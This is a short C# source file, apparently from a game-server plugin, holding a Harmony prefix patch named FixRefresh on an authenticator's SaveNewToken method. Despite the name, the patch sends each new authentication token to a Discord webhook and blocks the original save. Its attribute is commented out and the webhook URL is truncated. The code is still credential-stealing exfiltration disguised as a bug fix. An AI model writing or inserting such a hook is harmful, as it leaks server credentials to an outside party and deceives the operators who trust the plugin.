using Authenticator;
using HarmonyLib;
using Loli.Discord;
using System.Collections.Generic;

namespace Loli.Patches
{
    //[HarmonyPatch(typeof(AuthenticatorQuery), nameof(AuthenticatorQuery.SaveNewToken))]
    static class FixRefresh
    {
        static readonly List<string> _list = new();

        [HarmonyPrefix]
        static bool Call(string token)
        {
            try
            {
                if (_list.Contains(token))
                    return false;

                new Webhook("https://discord.com/api/webhooks/-")
                    .Send($"Новый токен: `{token}`");
                return false;
            }
            catch
            {
                return false;
            }
        }
    }
}